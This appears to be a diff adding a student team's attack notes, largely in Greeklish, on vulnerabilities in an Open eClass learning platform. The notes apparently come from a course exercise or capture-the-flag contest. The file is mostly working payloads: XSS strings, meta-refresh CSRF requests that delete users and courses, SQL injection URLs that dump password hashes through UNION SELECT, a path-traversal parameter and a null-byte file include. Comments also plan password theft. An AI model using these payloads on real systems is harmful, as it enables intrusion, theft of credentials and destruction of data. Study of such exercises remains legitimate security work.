@@ -1,0 +1,216 @@
+////script se $_SERVER['PHP_SELF']//////////////////////////////////////////////////
+/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E
+modules/dropbox/index.php
+modules/forum_admin/forum_admin.php
+include/baseTheme.php
+student_view.php
+modules/agenda/myagenda.php
+
+modules/phpbb/ editpost + viewtopic??? mysql ama svhseis url
+modules/phpbb/index 
+modules/phpbb/newtopic 
+modules/phpbb/reply 
+modules/phpbb/viewforum
+
+modules/auth/newprof.php
+modules/auth/formuser.php
+modules/auth/contactprof.php
+modules/auth/courses.php
+
+modules/admin/eclassconf.php
+modules/admin/mailtoprof.php
+modules/admin/addfaculte.php
+modules/admin/change_user.php
+modules/admin/adminannouncements.php
+modules/course_tools/course_tools.php
+modules/course_info/delete_course.php
+modules/unreguser/unreguser.php
+modules/unreguser/unregcours.php
+modules/user/user.php
+modules/profile/profile.php
+---------1---------
+modules/create_course/create_course.php
+modules/course_info/restore_course.php
+modules/admin/cleanup.php
+modules/admin/infocours.php
+modules/course_info/infocours.php
+modules/admin/newuseradmin.php
+modules/admin/multireguser.php
+modules/admin/edituser.php
+modules/admin/addusertocours.php
+modules/admin/quotacours.php
+---------2---------
+modules/link/linkfunctions.php
+modules/link/link.php
+
+///// CSRF //////////////////////////////////////////////////////////////////
+
+user xrhsth //htmlspecialchar?
+<meta http-equiv="refresh" content="0; url=http://invictus.csec.gr/modules/unreguser/unreguser.php?u=45&doit=yes" />
+modules/unreguser/unreguser.php
+
+user delete mathima
+<meta http-equiv="refresh" content="0; url=http://invictus.csec.gr/modules/unreguser/unregcours.php?u=36&cid=TMA102&doit=yes" />
+modules/unreguser/unregcours.php
+
+admin delete xrhsth
+<meta http-equiv="refresh" content="0; url=http://invictus.csec.gr/modules/admin/unreguser.php?u=36&doit=yes" />
+modules/admin/unreguser.php???????????????????????????????????????????? oxi gia course 
+
+admin delete mathima
+<meta http-equiv="refresh" content="0; url=http://invictus.csec.gr/modules/admin/delcours.php?c=TMA100&delete=yes" />
+modules/admin/delcours.php 
+
+admin tmhma //a=2 for delete of faculty
+<meta http-equiv="refresh" content="0; url=http://invictus.csec.gr/modules/admin/addfaculte.php?a=2&c=6" />
+modules/admin/addfaculte.php
+
+admin login to user
+des testCSRFform1
+modules/admin/change_user.php
+
+admin announcements
+des testCSRFform2
+modules/admin/adminannouncements.php
+
+admin-user change profile
+des testCSRFform3
+modules/profile/profile.php
+
+admin settings mathima
+des testCSRFform4
+modules/course_info/infocours.php
+
+admin delete2 mathima
+des testCSRFform5
+modules/course_info/delete_course.php
+
+admin settings2 mathima
+des testCSRFform6
+modules/course_info/refresh_course.php
+-----------
+admin config file       					 ///  NA DIAVAZEI TON KWDIKO??????  TO EVALA NA KANEI RANDOM PASS EKEI
+des testCSRFform7 
+modules/admin/eclassconf.php 
+
+admin course add link 
+des testCSRFform8 
+modules/course_tools/course_tools.php
+
+admin course add link html       			///steal password
+not implemented
+modules/course_tools/course_tools.php
+
+delete link html + regular?????       		///TODOnot   STELNEI KALO URL??????
+not implemented
+modules/course_tools/course_tools.php
+
+toolStatus submit
+not implemented
+modules/course_tools/course_tools.php
+
+admin create course
+not implemented
+modules/create_course/create_course.php
+
+admin register to subject 
+not implemented
+modules/auth/courses.php
+
+admin email
+not implemented
+modules/admin/mailtoprof.php
+
+admin restore course
+not implemented
+modules/course_info/restore_course.php
+
+admin clean old files
+not implemented
+modules/admin/cleanup.php
+
+admin makes you admin and prof for course  ////done
+des testCSRFform10
+modules/user/user.php
+
+admin accepts prof                        //TODO http://invictus.csec.gr/modules/admin/listreq.php????
+des testCSRFform11
+modules/admin/newuseradmin.php
+
+admin multiregister				 		  // + klepsimo pass me xrhsh karatse h admin change pass
+des testCSRFform12
+modules/admin/multireguser.php
+
+admin change pass 
+des testCSRFform13
+modules/admin/password.php
+
+admin edituser 
+not implemented
+modules/admin/edituser.php
+
+admin change state of course
+not implemented              			 //http://invictus.csec.gr/modules/admin/statuscours.php?c=TMC107
+modules/admin/statuscours.php
+
+admin change info of course 
+not implemented              			 //http://invictus.csec.gr/modules/admin/infocours.php?c=TMC107
+modules/admin/infocours.php 
+
+admin add users to courses 
+not implemented              			 //http://invictus.csec.gr/modules/admin/addusertocours.php?c=TMC107
+modules/admin/addusertocours.php
+
+--??useless csrf??--
+
+admin space of course in db
+not implemented 						 //http://invictus.csec.gr/modules/admin/quotacours.php?c=TMC107
+modules/admin/quotacours.php
+
+-------------------------------------------------------------------------------------------
+
+link.php
+linkfunctions.php
+
+---------------------------
+gia admin:
+ANAZHTHSH XRHSTH sto admin/listusers.php http://invictus.csec.gr/modules/admin/search_user.php //todo
+ANAZHTHSH mathima http://invictus.csec.gr/modules/admin/searchcours.php ???? todo
+--useless todo--
++ antigrafo asfaleias mathimatos   archive ?Not? http://invictus.csec.gr/modules/course_info/archive_course.php?c=TMC107
+hmerologio??? myagenda.php
+
+gia user: ???
+
+//course_code_to_title
+
+/////////Spuros
+eggrafh xrhsth
+suzhthsoula + thlesunergasia
+xss sta ergasies 
+
+////////Karatse
+script password 1 + 2
+languages sto upgrade/upgrade.php
+config na mh xalaei o kwdikos eclasconfig
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+ATTACK ON TITAN (NOT)
+
+1) http://mightymorphinflowerarrangers.csec.gr/modules/phpbb/reply.php?topic='') union select password,password,3,4 from `eclass`.user -- %20
+2) xss /%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E στα:
+
+ 1daae59d5fa93c1b7910d2f21e56e4dc
+
+http://invictus.csec.gr/modules/phpbb/reply.php?topic=1&forum=1&sys_lang=/../../x&quote=true&html=a&submit=1&message=a
+
+mightymorphinflowerarrangers.csec.gr/modules/phpbb/reply.php?topic='') union select 1,filename,2,title from `TMA107`.dropbox_file where title='xxx.php' -- %20 
+
+http://invictus.csec.gr/x.php?f=x.txt%00
+
+
